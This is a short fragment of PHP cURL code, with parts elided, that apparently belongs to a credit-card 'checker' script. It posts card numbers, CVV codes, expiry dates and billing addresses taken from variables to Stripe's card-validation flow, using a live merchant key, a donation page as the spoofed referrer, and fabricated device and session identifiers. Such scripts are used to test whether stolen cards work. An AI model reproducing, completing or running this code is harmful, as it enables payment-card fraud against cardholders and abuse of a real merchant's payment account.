...
'referer: https://checkout.stripe.com/v3/GIQm89WqdPipo5cyACzNQ.html?distinct_id=6d899732-202a-e87f-4746-9578e0e4dd19',
'sec-fetch-mode: cors',
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email=gg%40t.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2Fa44017d)&user_agent=Mozilla%2F5.0+(Linux%3B+Android+9%3B+vivo+1951)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F83.0.4103.83+Mobile+Safari%2F537.36&device_id=1909fec9-9c42-43c5-bb61-c7f6ae5b47f4&referrer=https%3A%2F%2Ffeministfrequency.com%2Fdonate-old%2F&pasted_fields=number&time_checkout_opened=1590846571&time_checkout_loaded=1590846569&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='
.$mes.'&card[exp_year]='.$ano.'&card[name]='
.$name.' '.$last.'&card[address_line1]='
.$street.'&card[address_city]='.$city.'&card[address_state]='.$state.'&card[address_zip]='.$postcode.'&card[address_country]=
United+States&time_on_page=36303&guid=580bef79-a759-4d1e-82b1-e250c341221f&muid=74b74655-dda6-4fe8-97ae-d962bd231f3b&sid=76798f53-a7a7-48f8-a485-70d93f095f6e&key=pk_live_3gf1PNKWwCxeqvT79prdhWg2');
